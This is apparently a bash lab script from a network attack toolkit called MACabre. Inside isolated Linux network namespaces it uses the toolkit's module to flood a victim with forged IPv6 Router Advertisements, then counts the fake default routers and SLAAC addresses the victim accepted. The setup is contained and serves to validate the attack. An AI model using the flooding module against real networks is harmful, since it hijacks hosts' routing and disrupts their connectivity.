#!/usr/bin/env bash
# Isolated Router Advertisement flooding lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   victim:   a host that accepts Router Advertisements (default kernel setting). It has no router.
#   attacker: a host that sends RAs with MACabre's module: one made-up router and one /64 per RA,
#             all from the attacker's MAC, taken from PREFIX_BASE.
#
# Phases:
#   Phase 1 (control): no RA has been sent. The victim has no default router and no address in the
#            prefix base. If it already has any, the lab cannot tell anything and exits 2.
#   Phase 2 (attack): the attacker sends ADVERTISEMENTS RAs. The victim must add at least two of the
#            made-up routers as default routes, and configure at least one SLAAC address inside the base.
#
# The lab prints how many routers and addresses the victim accepted, and the kernel's max_addresses
# limit for the victim interface. Kernels cap SLAAC addresses per interface (16 by default), so the
# address count stops there even when more prefixes were advertised. That limit is part of the result.
#
# Exit 0 when the control holds and the victim accepted the flood. Exit 1 when it did not. Exit 2 when
# the control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/router_advertisement_flooding_lab.sh
#
# Requirements: iproute2 (ip) with IPv6 enabled in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
PREFIX_BASE="2001:db8:f100::/48"
PREFIX_MATCH="2001:db8:f100:"        # any address inside PREFIX_BASE starts with this
ADVERTISEMENTS=20
ATTACKER_MAC="02:00:00:00:10:03"
VICTIM_MAC="02:00:00:00:10:02"

stop_lab() {
    for ns in lan victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for pair in "vic:victim:$VICTIM_MAC" "atk:attacker:$ATTACKER_MAC"; do
    IFS=: read -r name ns mac <<<"$pair"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
done

SEND_CODE='
import sys, threading
from macabre.attacks.router_advertisement_flooding import RouterAdvertisementFloodingConfig, run_router_advertisement_flooding
stats = run_router_advertisement_flooding(
    RouterAdvertisementFloodingConfig(iface=sys.argv[1], source_mac=sys.argv[2], prefix_base=sys.argv[3], advertisements=int(sys.argv[4])),
    threading.Event(), lambda _s: None,
)
print(stats.advertisements)
'

# Counts default routes through a link-local router address (the flood's fake routers).
count_flood_routers() {
    ip netns exec victim ip -6 route show default 2>/dev/null | grep -c "via fe80::" || true
}

# Counts global addresses on the victim inside PREFIX_BASE.
count_flood_addresses() {
    ip netns exec victim ip -6 addr show dev h-vic scope global 2>/dev/null | grep -c "inet6 $PREFIX_MATCH" || true
}

echo "Phase 1: control, no RA sent"
sleep 2
BASE_ROUTERS="$(count_flood_routers)"
BASE_ADDRS="$(count_flood_addresses)"
echo "  default routes via link-local routers: $BASE_ROUTERS"
echo "  global addresses inside $PREFIX_BASE: $BASE_ADDRS"
echo

echo "Phase 2: attacker sends $ADVERTISEMENTS Router Advertisements, one router and one /64 each, with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$SEND_CODE" h-atk "$ATTACKER_MAC" "$PREFIX_BASE" "$ADVERTISEMENTS" 2>/dev/null || echo 0)"
echo "  advertisements sent: $SENT"
sleep 4
ROUTERS="$(count_flood_routers)"
ADDRS="$(count_flood_addresses)"
MAX_ADDRS="$(cat /proc/sys/net/ipv6/conf/h-vic/max_addresses 2>/dev/null || echo unknown)"
echo "  default routes via link-local routers: $ROUTERS"
echo "  global addresses inside $PREFIX_BASE: $ADDRS (kernel max_addresses on victim: $MAX_ADDRS)"
echo

if [[ "$BASE_ROUTERS" != "0" || "$BASE_ADDRS" != "0" ]]; then
    echo "Control: the victim already had flood routers or prefix addresses before the attack. Result unreliable."
    exit 2
fi
if [[ "$ROUTERS" -ge 2 && "$ADDRS" -ge 1 ]]; then
    echo "Result: the victim accepted $ROUTERS of $SENT advertised routers and configured $ADDRS SLAAC address(es) from the flood. Vulnerable: unauthenticated RAs fill the host's router and prefix lists. Processing cost and the full table limits are not measured here."
    exit 0
fi
echo "Result: the victim did not accept the flood (routers: $ROUTERS, addresses: $ADDRS). Not validated."
exit 1
